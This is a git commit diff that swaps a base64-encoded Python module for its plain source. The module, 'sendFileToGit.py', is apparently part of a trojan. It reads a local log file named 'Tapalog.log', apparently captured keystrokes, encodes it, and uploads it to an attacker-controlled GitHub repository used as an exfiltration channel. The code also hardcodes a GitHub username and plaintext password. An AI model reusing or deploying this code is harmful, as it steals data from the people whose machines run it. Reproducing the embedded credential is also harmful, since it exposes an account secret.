c24286ff08b507e0bbb9be00451a41ca9e73a0f7
root <root@localhost.localdomain>
2019-01-07 12:51:56 -0500

    update sendF

--- modules/sendFileToGit.py
+++ modules/sendFileToGit.py
@@ -1,1 +1,30 @@
-ZnJvbSBnaXRodWIzIGltcG9ydCBsb2dpbgppbXBvcnQganNvbgppbXBvcnQgYmFzZTY0CmltcG9ydCBvcwoKcGF0aCA9ICJvdGhlcnMvIgpmaWxlUGF0aCA9IGJhc2U2NC5iNjRlbmNvZGUoIlRhcGFsb2cubG9nIikKVGFyZ2V0T1NmaWxlUGF0aCA9ICJUYXBhbG9nLmxvZyIKCmRlZiBjb25uZWN0X3RvX2dpdGh1YigpOgoJZ2ggPSBsb2dpbih1c2VybmFtZT0iTWFydmVuR2Fyc2FsbGkiLHBhc3N3b3JkPSIxJ21mb3IxYW0iKQoJcmVwbyA9IGdoLnJlcG9zaXRvcnkoIk1hcnZlbkdhcnNhbGxpIiwidHJvIikKCWJyYW5jaCA9IHJlcG8uYnJhbmNoKCJtYXN0ZXIiKQoJcmV0dXJuIGdoLHJlcG8sYnJhbmNoCgpkZWYgc3RvcmVfbW9kdWxlX3Jlc3VsdChkYXRhKToKCWdoLHJlcG8sYnJhbmNoID0gY29ubmVjdF90b19naXRodWIoKQoJcmVtb3RlX3BhdGg9IHBhdGgrInNlbmRGaWxlVG9HaXQvIitmaWxlUGF0aAoJcmVwby5jcmVhdGVfZmlsZShyZW1vdGVfcGF0aCwiVXBsb2FkIGZpbGUgJXMiJWZpbGVQYXRoLCBiYXNlNjQuYjY0ZW5jb2RlKGRhdGEpKQoJcmV0dXJuCgpkZWYgcnVuKCoqYXJncyk6Cgl0cnk6CgkJZmljaCA9IG9wZW4oVGFyZ2V0T1NmaWxlUGF0aCwgInIiKQoJCWNvbnRlbnQgPSBmaWNoLnJlYWQoKQoJCWZpY2guY2xvc2UoKQoJCXN0b3JlX21vZHVsZV9yZXN1bHQoY29udGVudCkKCQlyZXR1cm4gIlNlbmRGaWxlVG9HaXQ6IFN1Y2Nlc3NmdWxseSBzZW50IgoJZXhjZXB0OgoJCXJldHVybiAiU2VuZEZpbGVUb0dpdDogRmlsZSAlcyBub3QgZm91bmQiJSBUYXJnZXRPU2ZpbGVQYXRoCg==
+from github3 import login
+import json
+import base64
+import os
+
+path = "others/"
+filePath = base64.b64encode("Tapalog.log")
+TargetOSfilePath = "Tapalog.log"
+
+def connect_to_github():
+	gh = login(username="MarvenGarsalli",password="1'mfor1am")
+	repo = gh.repository("MarvenGarsalli","tro")
+	branch = repo.branch("master")
+	return gh,repo,branch
+
+def store_module_result(data):
+	gh,repo,branch = connect_to_github()
+	remote_path= path+"sendFileToGit/"+filePath
+	repo.create_file(remote_path,"Upload file %s"%filePath, base64.b64encode(data))
+	return
+
+def run(**args):
+	try:
+		fich = open(TargetOSfilePath, "r")
+		content = fich.read()
+		fich.close()
+		store_module_result(content)
+		return "SendFileToGit: Successfully sent"
+	except:
+		return "SendFileToGit: File %s not found"% TargetOSfilePath
